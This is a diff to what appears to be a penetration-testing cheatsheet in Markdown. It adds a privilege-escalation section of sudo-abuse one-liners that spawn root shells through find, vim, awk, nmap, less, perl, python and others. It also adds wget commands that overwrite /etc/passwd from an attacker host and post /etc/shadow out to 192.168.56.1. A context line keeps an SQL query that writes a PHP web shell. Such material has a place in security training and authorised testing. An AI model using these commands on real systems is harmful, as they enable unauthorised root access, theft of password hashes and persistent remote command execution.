@@ -129,7 +129,7 @@ This cheatsheet is definitely not "complete". I am sure i forgot to write down h
   * [Perl](#perl)
     + [Reverse Shell](#reverse-shell-2)
   * [PhpmyAdmin](#phpmyadmin)
-
+  * [Privilege Escalation](#privesc)
 ***
 
 # Reconnaissance
@@ -857,6 +857,44 @@ SELECT "<?php system($_GET['cmd']); ?>" into outfile "/var/www/html/shell.php"
 
 ***
 
+# PrivEsc
+## Sudo 
+### /usr/bin/find
+- `find /home -exec sh -i ;`
+- `find /etc/passwd -exec /bin/sh ;`
+- `find /bin -name nano -exec /bin/sh ;`
+### /usr/bin/nano
+- `nano /etc/passwd`
+### /usr/bin/vim
+- `vim -c '!sh'`
+### /usr/bin/man
+- `man man`
+- `!sh`
+### /usr/bin/awk
+- `awk 'BEGIN {system("/bin/sh")}'`
+### /usr/bin/less
+- `less /etc/hosts`
+- `!sh (!bash)`
+### /usr/bin/nmap ( –interactive and –script method)
+- `nmap --interactive`
+- `!sh`
+- `echo "os.execute('/bin/sh')" > /tmp/shell.nse && sudo nmap --script=/tmp/shell.nse`
+### /bin/more
+- `more /etc/hosts`
+- `!sh`
+### /usr/bin/wget
+- `wget http://192.168.56.1/passwd -O /etc/passwd`
+- `wget --post-file=/etc/shadow 192.168.56.1`
+### /usr/sbin/apache2
+- `apache2 -f /etc/shadow`
+### perl
+- `perl -e 'exec "/bin/bash";'`
+### python
+- `python -c 'import pty;pty.spawn("/bin/bash")'`
+### vi
+- `!bash`
+### mysql
+- `! sh`
 
 ## Useful links
 HTTP Shellshock vulnerability(CGI): https://book.hacktricks.xyz/pentesting/pentesting-web/cgi
